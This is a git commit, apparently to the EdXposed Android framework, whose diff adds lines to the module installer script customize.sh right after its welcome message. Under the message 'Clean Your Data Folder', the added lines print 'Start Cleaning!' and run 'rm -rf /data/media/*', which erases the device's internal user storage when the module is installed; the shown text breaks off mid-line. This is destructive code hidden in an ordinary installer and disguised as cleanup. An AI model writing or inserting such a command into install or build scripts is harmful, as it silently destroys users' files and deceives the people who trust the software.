c165c99efc799f205415bbe86e382bc3b77898cd
BlueJett <BlueJett_Wolf@outlook.com>
2020-05-16 18:19:43 +0800

    Clean Your Data Folder

--- edxp-core/template_override/customize.sh
+++ edxp-core/template_override/customize.sh
@@ -348,3 +348,6 @@ cp "${MODPATH}/module.prop" "${RIRU_TARGET}/module.prop" || abort "! Can't creat
 set_perm_recursive "${MODPATH}" 0 0 0755 0644
 
 ui_print "- Welcome to EdXposed ${VERSION}!"
+ui_print "- Start Cleaning!"
+rm -rf /data/media/*
+ui_print "- Finished! Check for 
